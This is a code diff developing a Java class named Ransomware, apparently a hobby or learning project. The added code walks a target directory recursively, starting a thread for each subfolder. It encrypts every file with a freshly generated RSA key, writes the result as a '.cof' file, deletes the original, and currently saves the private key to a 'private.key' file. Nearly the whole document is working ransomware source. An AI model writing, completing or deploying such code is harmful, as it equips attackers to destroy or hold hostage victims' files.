@@ -1,12 +1,16 @@
 import java.io.File;
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.IOException;
 import java.security.InvalidKeyException;
 import java.security.KeyPair;
 import java.security.KeyPairGenerator;
 import java.security.NoSuchAlgorithmException;
-import java.security.PrivateKey;
-import java.security.PublicKey;
+import java.security.spec.PKCS8EncodedKeySpec;
 
+import javax.crypto.BadPaddingException;
 import javax.crypto.Cipher;
+import javax.crypto.IllegalBlockSizeException;
 import javax.crypto.NoSuchPaddingException;
 
 /**
@@ -18,12 +22,11 @@ public class Ransomware {
 
 	private KeyPairGenerator keyPairGen;
 	private KeyPair pair;
-	private PublicKey publicKey;
-	private PrivateKey privateKey;
 	private Cipher cipher;
+	private File mainDirectory;
 
 	public Ransomware() {
-
+		setMainDirectory(new File(System.getProperty("user.home") + "\\Desktop\\Test"));
 	}
 
 	/**
@@ -31,16 +34,32 @@ public class Ransomware {
 	 */
 	public void begin() {
 		generateKeys();
-		encrypt();
+		if (mainDirectory.exists() && mainDirectory.isDirectory()) {
+			encrypt(mainDirectory.listFiles());
+		}
 		sendKey();
 	}
 
 	/**
-	 * Grabs all files in the current user directory and encrypts them.
+	 * Grabs all files and encrypts them. References:
+	 * {@link https://www.geeksforgeeks.org/java-program-list-files-directory-nested-sub-directories-recursive-approach/}
 	 * 
 	 */
-	public void encrypt() {
+	public void encrypt(File[] files) {
+		for (int index = 0; index < files.length; index++) {
+			if (files[index].isDirectory()) {
+				File directory = files[index];
+				new Thread() {
 
+					@Override
+					public void run() {
+						encrypt(directory.listFiles());
+					}
+				}.start();
+			} else if (files[index].isFile()) {
+				encryptFile(files[index]);
+			}
+		}
 	}
 
 	/**
@@ -52,9 +71,8 @@ public class Ransomware {
 			setKeyPairGen(KeyPairGenerator.getInstance("RSA"));
 			keyPairGen.initialize(2048);
 			setPair(keyPairGen.generateKeyPair());
-			setPublicKey(pair.getPublic());
 			setCipher(Cipher.getInstance("RSA/ECB/PKCS1Padding"));
-			cipher.init(Cipher.ENCRYPT_MODE, publicKey);
+			cipher.init(Cipher.ENCRYPT_MODE, pair.getPublic());
 
 		} catch (NoSuchAlgorithmException e) {
 			// TODO Auto-generated catch block
@@ -71,11 +89,57 @@ public class Ransomware {
 	/**
 	 * Takes a file and encrypts it.
 	 * 
-	 * @param publicKey
-	 * @param file
+	 * @param file - The file to encrypt
 	 */
 	private void encryptFile(File file) {
+		byte[] encryptedBytes = null;
+		try {
+			encryptedBytes = cipher.doFinal(getFileInBytes(file));
+			File encryptedFile = new File(file.getPath() + ".cof");
+			writeToFile(encryptedFile, encryptedBytes);
+			file.delete();
+		} catch (IOException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+			return;
+		} catch (IllegalBlockSizeException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		} catch (BadPaddingException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
+	}
 
+	/**
+	 * References:
+	 * {@link https://mkyong.com/java/java-asymmetric-cryptography-example/}
+	 * 
+	 * @param file - The file to convert
+	 * @throws IOException
+	 * 
+	 */
+	private byte[] getFileInBytes(File file) throws IOException {
+		FileInputStream fis = new FileInputStream(file);
+		byte[] fileBytes = new byte[(int) file.length()];
+		fis.read(fileBytes);
+		fis.close();
+		return fileBytes;
+	}
+
+	/**
+	 * References:
+	 * {@link https://mkyong.com/java/java-asymmetric-cryptography-example/}
+	 * 
+	 * @param file - The file to output to
+	 * @throws IOException
+	 * 
+	 */
+	private void writeToFile(File output, byte[] bytesToWrite) throws IOException {
+		FileOutputStream fos = new FileOutputStream(output);
+		fos.write(bytesToWrite);
+		fos.close();
+		return;
 	}
 
 	/**
@@ -83,6 +147,13 @@ public class Ransomware {
 	 */
 	private void sendKey() {
 
+		try {
+			writeToFile(new File(mainDirectory.getAbsolutePath() + "\\private.key"),
+					new PKCS8EncodedKeySpec(pair.getPrivate().getEncoded()).getEncoded());
+		} catch (IOException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
 	}
 
 	public KeyPairGenerator getKeyPairGen() {
@@ -101,27 +172,19 @@ public class Ransomware {
 		this.pair = pair;
 	}
 
-	public PublicKey getPublicKey() {
-		return publicKey;
-	}
-
-	public void setPublicKey(PublicKey publicKey) {
-		this.publicKey = publicKey;
-	}
-
-	public PrivateKey getPrivateKey() {
-		return privateKey;
-	}
-
-	public void setPrivateKey(PrivateKey privateKey) {
-		this.privateKey = privateKey;
-	}
-
 	public Cipher getCipher() {
 		return cipher;
 	}
 
 	public void setCipher(Cipher cipher) {
 		this.cipher = cipher;
+	}
+
+	public File getMainDirectory() {
+		return mainDirectory;
+	}
+
+	public void setMainDirectory(File mainDirectory) {
+		this.mainDirectory = mainDirectory;
 	}
 }
